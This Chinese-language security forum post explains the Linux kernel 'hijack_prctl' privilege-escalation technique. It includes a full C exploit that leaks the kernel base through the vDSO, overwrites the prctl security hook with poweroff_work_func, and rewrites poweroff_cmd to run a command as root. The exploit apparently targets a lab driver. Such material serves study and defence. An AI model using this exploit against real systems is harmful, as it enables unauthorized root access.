# linux 内核提权总结(demo+exp分析) -- 任意读写(三) 


[发表于看雪论坛](https://bbs.pediy.com/user-839858.htm)

## hijack_prctl篇

+ prctl函数: 用户态函数，可用于定制进程参数，非常适合和内核进行交互
    1. 用户态执行prctl函数后触发prctl系统调用
    2. 内核接收参数后执行security_task_prctl
    3. security_task_prctl执行hook.task_prctl

+ poweroff_work_func函数: 内核函数，执行 run_cmd(poweroff_cmd)，即root权限执行poweroff_cmd

+ 攻击流程:
    1. 劫持hook.task_prctl为目标函数地址(poweroff_work_func)
    2. 修改poweroff_cmd为目标指令
    3. 用户执行prctl函数，触发

### 一. 利用步骤

#### 1. 定位内核加载基地址(开启kaslr)

+ 同hijack_vdso，泄漏vdso地址，因为内核kaslr开启后，只有较高字节的地址发生偏移，且vdso与基地址相距较近，所以可以使用vdso定位内核加载地址

#### 2. 定位hook.prctl，poweroff_cmd地址

+ gdb调试内核并在security_task_prctl函数处下断点，用户态程序执行prctl函数，进入security_task_prctl函数，单步执行汇编指令，通过内存查看hook.task_prctl 地址

+ gdb 执行 p poweroff_cmd，获得poweroff_cmd真实地址
+ 获得hook.prctl，poweroff_cmd与内核基地址固定偏移

#### 3. 修改poweroff_cmd 为任意指令
#### 4. 用户态执行prctl函数，触发

### 二. 驱动代码(见cred篇)

### 三. exp

``` c
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/auxv.h>
#include <sys/prctl.h>

#define CHANGE_POINT 0x100000
#define RW_READ 0x100001
#define RW_WRITE 0x100002
#define SET_MEM 0X100003

size_t poweroff_cmd = 0;
size_t prctl_hook = 0;
size_t poweroff_work_func = 0;
size_t vmlinux_base = 0;

struct vunl
{
    char *point;
    size_t size;
} VUNL;

void leak_data(int fd, char *buf)
{
    char *res = NULL;

    VUNL.size = 0x1000;
    for (size_t addr = 0xffffffff80000000; addr < 0xffffffffffffffff; addr += 0x1000)
    {
        VUNL.point = (char *)addr;

        ioctl(fd, CHANGE_POINT, &VUNL); //change the point
        ioctl(fd, RW_READ, buf);
        if (!strcmp("gettimeofday", buf + 0x2b5))
        {
            printf("[+] the addr of VDSO is: 0x%lx\n", addr);
            vmlinux_base = addr & 0xffffffffff000000;
            printf("[+] the addr of vmlinux base is: 0x%lx\n", vmlinux_base);
            break;
        }

        puts("[-] not found, try again!\n");
    }
    return;
}

int main(int argc, char *argv[])
{
    int fd = 0;
    char *buf = malloc(0x1000);
    char cmd[] = "/bin/chmod 777 /flag\x00";

    fd = open("/dev/rw_any_dev", O_RDWR);
    leak_data(fd, buf);
    poweroff_cmd = vmlinux_base + 0xe3e1a0;
    prctl_hook = vmlinux_base + 0xe81078;
    poweroff_work_func = vmlinux_base + 0x075480;

    printf("[+] the addr of poweroff_cmd is: 0x%lx\n", poweroff_cmd);
    printf("[+] the addr of prctl hook is: 0x%lx\n", prctl_hook);
    printf("[+] the addr of orderly_poweroff is: 0x%lx\n", poweroff_work_func);

    VUNL.size = strlen(cmd)+1;
    // VUNL.size = strlen(argv[1])+1;
    VUNL.point = (char *)poweroff_cmd;
    ioctl(fd, CHANGE_POINT, &VUNL);
    ioctl(fd, RW_WRITE, cmd);
    // ioctl(fd, RW_WRITE, argv[1]);

    VUNL.size = 8;
    VUNL.point = (char *)prctl_hook;
    ioctl(fd, CHANGE_POINT, &VUNL);
    ioctl(fd, RW_WRITE, &poweroff_work_func);
    puts("[+] the cmd arg must have an ansolute_address");
    prctl(PR_GET_NAME, "test");

    return 0;
}
```


